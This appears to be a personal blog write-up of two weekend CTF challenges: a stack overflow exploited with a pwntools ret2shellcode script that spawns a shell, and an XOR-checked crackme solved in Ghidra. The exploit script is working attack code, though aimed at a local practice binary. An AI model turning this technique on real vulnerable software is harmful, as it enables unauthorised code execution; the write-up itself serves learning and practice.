---
title: "Notes from a Weekend CTF: pwn and rev"
date: 2025-11-22 21:15:00 -0500
categories: [Security, CTF]
tags: [ctf, pwn, reverse-engineering, ghidra]
description: "Two challenges from a weekend CTF: a stack overflow and a small crackme."
---

## The pwn: a textbook overflow

The binary read `0x100` bytes into a `0x40`-byte buffer with no stack canary and
NX off. Classic ret2shellcode territory.

```python
from pwn import *

p = process('./vuln')
offset = 72
shellcode = asm(shellcraft.sh())
payload = shellcode.ljust(offset, b'A') + p64(buf_addr)
p.sendline(payload)
p.interactive()
```

Finding `buf_addr` was the only real work: leaking it from a helpful `printf`
that echoed the buffer's address back.

## The rev: a crackme in Ghidra

Loaded the second binary into **Ghidra** and let the decompiler do its thing. The
check was an XOR of the input against a hard-coded key, compared to a static blob:

```c
for (int i = 0; i < len; i++)
    if ((input[i] ^ 0x2a) != expected[i]) return 0;
```

XOR the blob back by `0x2a` and the flag falls out. Not hard, but a clean reminder
that the decompiler is the fastest path from "opaque binary" to "obvious logic."

## Why I keep doing these

CTFs are the cheapest way to keep both the offensive and reversing muscles warm,
and the rev side feeds directly into my [game-hacking](/categories/game-hacking/)
projects.
